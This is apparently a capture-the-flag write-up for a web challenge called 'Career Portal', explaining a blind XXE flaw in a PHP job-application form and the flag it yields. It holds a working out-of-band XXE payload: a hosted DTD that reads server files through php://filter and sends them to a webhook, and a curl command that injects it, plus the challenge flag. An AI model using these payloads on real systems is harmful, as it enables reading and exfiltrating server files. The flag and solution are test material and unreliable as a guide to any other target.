# Career Portal

Pretera is hiring, and their careers page features a shiny new application form.

https://qwertyuioplkjh-csc26.cybersecuritychallenge.al

## Challenge Information

- **Flag**: `CSC26{c4r33r_p0rt4l_h1r3}`

## Prerequisites

Before starting the exploitation, you **MUST** set up the following:

1. **Webhook URL**: Go to [webhook.site](https://webhook.site) and retrieve your unique URL. This will catch the exfiltrated data.
2. **Public File Host**: You need a place to host your malicious DTD file (e.g., [GitHub Gist](https://gist.github.com)).

## Vulnerability Description

The career application form at `/careers.php` submits data to `/submit.php` with a `create_xml=true` parameter. The server builds XML from user-supplied form fields and processes it using PHP's `DOMDocument::loadXML()` and `simplexml_import_dom()` functions with external entity processing enabled.

**Key Finding**: This is a **Blind XXE** vulnerability - external entities are resolved and files are read, but the content is not reflected in the HTTP response. This requires Out-of-Band (OOB) exfiltration to extract data.

### Evidence of Vulnerability

- **51 character response**: XML parsed successfully, file was read
- **185+ character response**: XML parsing error (simplexml_import_dom warning)
- **File location**: `/var/www/html/flag.php` (confirmed via successful reads)

## Exploitation

### Method: Out-of-Band XXE with Parameter Entities

Since the output is not reflected, we use OOB exfiltration:

1. **Create evil.dtd** with parameter entities that exfiltrate data:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/flag.php">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://YOUR_WEBHOOK_URL?flag=%file;'>">
%eval;
%exfil;
```

2. **Host evil.dtd** publicly (GitHub Gist, Pastebin, or your server)

3. **Send XXE payload** in the `name` form field:

```xml
<!DOCTYPE foo [<!ENTITY % dtd SYSTEM "YOUR_DTD_URL">%dtd;]><x>t</x>
```

4. **Receive exfiltrated data** at your webhook (base64 encoded)

5. **Decode** to get the flag

## Quick Start

### Automated Exploitation

```bash
python exploit.py
```

Follow the interactive prompts to:

- Set up your webhook (webhook.site or interactsh)
- Host the DTD file
- Send the exploit
- Decode the flag

### Manual Exploitation

1. Get a webhook URL from https://webhook.site

2. Update `evil.dtd` with your webhook URL

3. Create a GitHub Gist with `evil.dtd` content (Use the "Raw" button to get the direct URL)

4. Send the exploit:

```bash
curl -X POST "https://qwertyuioplkjh-csc26.cybersecuritychallenge.al/submit.php" \
  --data-urlencode "create_xml=true" \
  --data-urlencode "name=<!DOCTYPE foo [<!ENTITY % dtd SYSTEM 'GIST_RAW_URL'>%dtd;]><x>t</x>" \
  --data-urlencode "email=test@test.com" \
  --data-urlencode "bio=test"
```

5. Check your webhook for the base64 encoded flag

6. Decode:

```bash
echo "BASE64_STRING" | base64 -d
```

## Technical Details

### Server-Side Code Flow

Based on error messages and behavior:

```php
// submit.php (inferred)
if (isset($_POST['create_xml'])) {
    $xml_string = build_xml_from_form($_POST); // Builds XML from name, email, bio
    $dom = new DOMDocument();
    $dom->loadXML($xml_string); // Line 12 - processes external entities
    $xml = simplexml_import_dom($dom); // Line 13 - warning occurs here
    // Process application...
}
```

### Why Blind XXE?

The application processes the XML and resolves external entities, but:

- No XML content is reflected in the response
- No error messages include entity content
- The parsed data is likely stored or processed internally

## Flag

```
CSC26{c4r33r_p0rt4l_h1r3}
```
